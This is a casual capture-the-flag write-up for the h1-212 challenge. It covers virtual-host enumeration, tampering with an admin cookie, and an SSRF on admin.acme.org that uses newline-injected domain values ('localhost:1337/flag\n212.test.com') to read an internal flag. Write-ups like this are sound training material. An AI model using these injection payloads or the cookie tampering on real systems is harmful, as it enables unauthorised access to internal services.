# h1-212

OK here is my write up 


so first i start brute force and crawl directory to check if possible to get some files there (using my tool https://github.com/chamli/CyberCrowl)

then i used virtual-host-discovery tool to get all virtual host there 

(i know that jobert make this task so that's why i checked his github :D and yeah it was there ) 

![image](https://user-images.githubusercontent.com/7364615/33027283-f949a3ae-ce12-11e7-98f5-222dcb97319e.png)

![image](https://user-images.githubusercontent.com/7364615/33027406-4acf6b14-ce13-11e7-9310-770652435ca4.png)

```
Found: www.acme.org (200)
Found: dev.acme.org (200)
Found: local (200)
Found: localhost (200)
Found: status.acme.org (200)
Found: status (200)
Found: staging.acme.org (200)
Found: staging (200)
Found: development (200)
Found: development.acme.org (200)
Found: uat (200)
Found: uat.acme.org (200)
Found: acme.org (200)
Found: beta (200)
Found: beta.acme.org (200)
Found: secure (200)
Found: secure.acme.org (200)
Found: mobile (200)
Found: mobile.acme.org (200)
Found: 127.0.0.1 (200)
Found: m.acme.org (200)
Found: m (200)
Found: admin (200)
Found: admin.acme.org (200)
Found: old (200)
Found: old.acme.org (200)
Found: v1.acme.org (200)
Found: v1 (200)
Found: v2.acme.org (200)
Found: v2 (200)
Found: v3.acme.org (200)
Found: v3 (200)
Found: alpha (200)
Found: alpha.acme.org (200)
```
so as description said :  
(An engineer of acme.org launched a new server for a new admin panel)

admin.acme.org this is the one :D

After that i check header : 
```
root@ip-172-31-20-83:/home/ubuntu# curl -I http://admin.acme.org
HTTP/1.1 200 OK
Date: Sat, 18 Nov 2017 22:59:11 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: admin=no
Content-Type: text/html; charset=UTF-8
```
next i start get 406 after make( admin=yes ) and change (GET to POST)

![image](https://user-images.githubusercontent.com/7364615/32996613-4079913c-cd85-11e7-8b8c-6ba8b8aa1192.png)

so i get some stackoverflow solution which ask to look for good content-type
```
https://stackoverflow.com/questions/14251851/what-is-406-not-acceptable-response-in-http
```

brute force all type possible get that "application/json" is the one :D 

![image](https://user-images.githubusercontent.com/7364615/32996624-64af4498-cd85-11e7-8b15-b046b0d6b4de.png)


THEN START PLAY WITH JSON DATA 

![image](https://user-images.githubusercontent.com/7364615/32996628-6e864b56-cd85-11e7-9749-30779d47e516.png)

So by send random data we get second error 'domain' required

By start send random domain "www.test.com" make it work and get another error :D  

```
{"error":{"domain":"incorrect value, sub domain should contain 212"}}
```
so when domain is valid we get data base64 (Easy way to get that valid domain site:212.*.com) 

![image](https://user-images.githubusercontent.com/7364615/33027790-629d5b6a-ce14-11e7-824e-3a79ac055f67.png)

Then send request 

![image](https://user-images.githubusercontent.com/7364615/32996636-7dab1698-cd85-11e7-8a26-a8c27b0cfab0.png)

![image](https://user-images.githubusercontent.com/7364615/32996640-8aa5e800-cd85-11e7-80e4-04356e646d68.png)

which is the source code of that website

It's look like SSRF here guys :D 

So just need to bypass .com and 212 containe , if we send domain with 212.*.com we can break all check 

after read alot from here (thx orange ) and other article 
https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf 

i notice i can use "feed line" to make 2 request or more !! (\n) 

In this case it will make three request "localhost","212.test.com","212.hahahah.com"
```
{"domain":"localhost\n212.test.com\n212.hahahah.com"}  
```

Then when i start look for flag , i didnt get the point , Because i get always Null data for the first request of localhost

```
{"domain":"localhost/flag\n212.test.com"}  
```

And then make brute force using Burp Suite ,But before that get end , i check 1337 as its for "Leet" guys :D 

And Yeah found port 1337 open :D 
```
{"domain":"localhost:1337/flag\n212.test.com"}  
{"domain":"localhost/server-status\n212.test.com"} 
```

![image](https://user-images.githubusercontent.com/7364615/33026321-766f86f8-ce10-11e7-9fdd-544673744e51.png)


with this data it will increment id+2

id-1 for localhost and last id for 212.test.com


So just get request of the id+1 get make us read the flag 

then base64 flag data and pwn it :D

1337 : leet port :D

![image](https://user-images.githubusercontent.com/7364615/33025984-b0f7e3f2-ce0f-11e7-8513-ee303f78c264.png)

FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6


Amazing ctf :D
